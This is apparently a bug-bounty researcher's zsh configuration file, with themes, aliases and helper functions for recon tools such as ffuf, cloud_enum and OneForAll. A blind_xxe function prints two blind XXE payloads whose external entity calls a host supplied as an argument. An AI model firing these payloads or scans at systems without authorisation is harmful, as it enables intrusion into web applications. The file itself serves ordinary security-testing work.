export ZSH="/home/arbenn/.oh-my-zsh"

#ZSH_THEME="random"
#ZSH_THEME="norm"
#ZSH_THEME="candy"
#ZSH_THEME="lukerandall"
#ZSH_THEME="linuxonly"
#ZSH_THEME="theunraveler"
#ZSH_THEME="darkblood"
#ZSH_THEME="adben"
#ZSH_THEME="agnoster"
ZSH_THEME="powerlevel10k/powerlevel10k"

plugins=(zsh-autosuggestions history python sublime sudo urltools web-search)

source $ZSH/oh-my-zsh.sh

alias p2s="python2 -m SimpleHTTPServer"
alias p3s="python -m http.server"
alias sstart="systemctl start"
alias sstop="systemctl stop"
alias srestart="systemctl restart"
alias lt="ls -lt"
alias gitc="git clone"
alias cdb="cd ~/BugBounty/"
alias xclip="xclip -sel clip"
alias nmap="grc nmap"
alias pip="/usr/bin/pip"
alias pip2="/usr/bin/pip2"
alias myip="curl http://ipecho.net/plain"
alias smbmap="python2 /usr/bin/smbmap"
alias ipaddr="ifconfig wlp1s0 | grep -w inet | awk '{print \$2}'"
alias cyclic="python2 /usr/bin/cyclic"
alias cat="bat --style=grid"

run_cloudenum() {
    python /home/arbenn/tools/cloud_enum/cloud_enum.py -k $1 >> $1.txt
}

run_ffuf() {
    ffuf -c -w ~/tools/SecLists/Discovery/Web-Content/$1 -mc 200,204,301,302,307,401,403,500,405 -e .db,.html,.zip -recursion -recursion-depth 2 -maxtime-job 300 -u $2FUZZ
}

run_oneforall() {
    docker run -it --rm -v ~/tools/oneforall/results:/OneForAll/results shmilylty/oneforall --target $1 --alive False run
}

run_mobsf() {
    docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf
}

github_subdomains() {
    python /home/arbenn/tools/github-search/github-subdomains.py -t """[TOKEN]""" -d $1
}

blind_xxe() {
    echo '<!DOCTYPE root [<!ENTITY test SYSTEM "http://'$1'">]><root>&test;</root>'
    echo " "
    echo '<?xml version="1.0" ?><!DOCTYPE root [ <!ENTITY % ext SYSTEM "http://'$1'"> %ext; ]><r></r>'
}


cwd_to_urxvt() {
    local update="\0033]777;cwd-spawn;path;$PWD\0007"

    case $TERM in
    screen*)
    # pass through to parent terminal emulator
        update="\0033P$update\0033\\";;
    esac

    echo -ne "$update"
}

cwd_to_urxvt # execute upon startup to set initial directory

chpwd_functions=(${chpwd_functions} cwd_to_urxvt)

export GOROOT=/usr/local/go
export GOPATH=$HOME/go
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH

# To customize prompt, run `p10k configure` or edit ~/.p10k.zsh.
[[ ! -f ~/.p10k.zsh ]] || source ~/.p10k.zsh
